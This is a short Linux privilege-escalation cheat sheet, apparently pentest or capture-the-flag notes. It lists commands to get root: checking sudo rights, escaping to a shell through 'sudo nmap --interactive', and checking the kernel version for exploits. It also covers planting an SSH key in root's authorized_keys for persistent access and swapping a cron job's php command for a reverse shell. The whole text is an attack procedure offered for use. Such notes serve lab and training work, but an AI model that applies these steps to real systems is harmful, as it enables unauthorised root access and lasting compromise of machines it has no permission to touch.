### Privilege Escalation

#### If you have found any passwords on the machine, try running as root
```
sudo su
```
#### Check which commands sudo can run
``` 
sudo -l

# If you get something like 
# User asterisk may run the following commands on this host:
#    (root) NOPASSWD: /sbin/shutdown
#    (root) NOPASSWD: /usr/bin/nmap
# Google the application you can run as root, eg. nmap privilege escalation
sudo nmap --interactive
nmap> !sh
``` 
#### Check which version/year of Linux for privesc exploits
```
uname -a
```

#### If you can modify files as root
#### Try to add ssh public key to root/.ssh/authorized_keys
```
# Generate ssh key pair
ssh-keygen -o

# Copy the public key
cat /root/.ssh/id_rsa.pub

# Paste it into your root/.ssh/authorized_keys file (create if necessary)
# Then try and access through ssh from attacking machine
ssh root@targetip
```

#### Check the crontab for cron jobs you can exploit
```
cat /etc/crontab
# If you locate a cron job with a php command, replace it with a php reverse shell
```
